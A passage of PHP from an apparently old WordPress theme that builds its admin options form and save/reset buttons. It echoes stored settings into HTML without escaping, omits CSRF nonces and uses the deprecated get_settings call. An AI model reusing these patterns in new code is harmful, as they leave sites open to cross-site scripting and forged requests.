    if ( $_REQUEST['saved'] ) echo '<div id="message" class="updated fade"><p><strong>'.$themename.' settings saved.</strong></p></div>';
    if ( $_REQUEST['reset'] ) echo '<div id="message" class="updated fade"><p><strong>'.$themename.' settings reset.</strong></p></div>';
?>
<div class="wrap">
<h2><?php echo $themename; ?> options</h2>
<form method="post">
<table class="optiontable">
<?php foreach ($options as $value) {
	switch ( $value['type'] ) {
	case 'text':
	option_wrapper_header($value);
?>
		        <input style="width:400px;" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" type="<?php echo $value['type']; ?>" value="<?php if ( get_settings( $value['id'] ) != "") { echo get_settings( $value['id'] ); } else { echo $value['std']; } ?>" />
<?php
		option_wrapper_footer($value);
		break;
		case 'select':
		option_wrapper_header($value);
?>
	            <select style="width:240px;" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>">
<?php foreach ($value['options'] as $option) { ?>
	                <option<?php if ( get_settings( $value['id'] ) == $option) { echo ' selected="selected"'; } elseif ($option == $value['std']) { echo ' selected="selected"'; } ?>><?php echo $option; ?></option>
<?php } ?>
	            </select>
<?php
		option_wrapper_footer($value);
		break;
		case 'textarea':
		$ta_options = $value['options'];
		option_wrapper_header($value);
?>
				<textarea name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" style="width:400px;height:100px;"><?php
				if( get_settings($value['id']) != "") {
						echo stripslashes(get_settings($value['id']));
					}else{
						echo $value['std'];
}?></textarea>
<?php
		option_wrapper_footer($value);
		break;
		case "radio":
		option_wrapper_header($value);
 		foreach ($value['options'] as $key=>$option) {
				$radio_setting = get_settings($value['id']);
				if($radio_setting != ''){
		    		if ($key == get_settings($value['id']) ) {
						$checked = "checked=\"checked\"";
						} else {
							$checked = "";
						}
				}else{
					if($key == $value['std']){
						$checked = "checked=\"checked\"";
					}else{
						$checked = "";
					}
}?>
	            <input type="radio" name="<?php echo $value['id']; ?>" value="<?php echo $key; ?>" <?php echo $checked; ?> /><?php echo $option; ?><br />
<?php
		}
		option_wrapper_footer($value);
		break;
		case "checkbox":
		option_wrapper_header($value);
						if(get_settings($value['id'])){
							$checked = "checked=\"checked\"";
						}else{
							$checked = "";
						}
?>
		            <input type="checkbox" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" value="true" <?php echo $checked; ?> />
<?php
		option_wrapper_footer($value);
		break;
	case "multicheck":
		option_wrapper_header($value);
 		foreach ($value['options'] as $key=>$option) {
	 			$pn_key = $value['id'] . '_' . $key;
				$checkbox_setting = get_settings($pn_key);
				if($checkbox_setting != ''){
		    		if (get_settings($pn_key) ) {
						$checked = "checked=\"checked\"";
						} else {
							$checked = "";
						}
				}else{
					if($key == $value['std']){
						$checked = "checked=\"checked\"";
					}else{
						$checked = "";
					}
}?>
	            <input type="checkbox" name="<?php echo $pn_key; ?>" id="<?php echo $pn_key; ?>" value="true" <?php echo $checked; ?> /><label for="<?php echo $pn_key; ?>"><?php echo $option; ?></label><br />
<?php
		}
		option_wrapper_footer($value);
		break;
		case "heading":
?>
		<tr valign="top">
		    <td colspan="2" style="text-align: center;"><h3><?php echo $value['name']; ?></h3></td>
		</tr>
<?php
		break;
		default:
		break;
	}
}
?>
</table>
<p class="submit">
<input name="save" type="submit" value="Save changes" />
<input type="hidden" name="action" value="save" />
</p>
</form>
<form method="post">
<p class="submit">
<input name="reset" type="submit" value="Reset" />
<input type="hidden" name="action" value="reset" />
</p>
</form>
<?php
}
function option_wrapper_header($values){
?>
<tr valign="top">
    <th scope="row"><?php echo $values['name']; ?>:</th>
	    <td>
<?php
}
function option_wrapper_footer($values){
?>
    </td>
	</tr>
	<tr valign="top">
		<td>&nbsp;</td><td><small><?php echo $values['desc']; ?></small></td>
	</tr>
    </div>
<?php
}
function mytheme_wp_head() {
	$stylesheet = get_option('green_alt_stylesheet');
	if($stylesheet != ''){?>
<?php }
}
add_action('wp_head', 'mytheme_wp_head');
add_action('admin_menu', 'mytheme_add_admin');
?>
